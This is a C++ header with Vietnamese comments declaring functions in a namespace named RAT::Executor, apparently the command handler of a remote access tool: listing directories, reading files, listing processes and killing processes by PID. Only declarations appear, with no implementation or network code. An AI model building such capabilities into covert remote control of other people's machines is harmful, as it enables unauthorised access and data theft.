#pragma once

#include <string>

namespace RAT
{
    namespace Executor
    {
        // Liệt kê danh sách file / thư mục trong đường dẫn
        std::string list_directory(const std::string& path);

        // Đọc nội dung file 
        std::string read_file_content(const std::string& filepath);

        // Liệt kê danh sách tiến trình đang chạy
        std::string list_processes();

        // Kết thúc tiến trình theo PID
        std::string kill_process(int pid);
    }
}   